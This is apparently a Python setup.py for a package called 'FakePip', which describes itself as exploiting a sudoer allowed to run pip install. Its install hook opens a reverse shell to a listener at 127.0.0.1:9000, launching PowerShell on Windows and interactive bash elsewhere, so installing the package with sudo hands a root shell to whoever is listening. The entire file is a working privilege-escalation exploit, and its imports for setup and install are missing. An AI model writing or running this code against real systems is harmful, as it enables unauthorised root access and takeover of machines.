import platform
import os
import socket
import subprocess

class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = '127.0.0.1'  
    LPORT = 9000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    
    if platform.system() == "Windows":
        # Windows 反弹 shell
        subprocess.call(
            ["powershell.exe"],
            stdin=s, stdout=s, stderr=s
        )
    else:
        # Linux/macOS 反弹 shell
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      zip_safe=False,
      cmdclass={'install': CustomInstall})

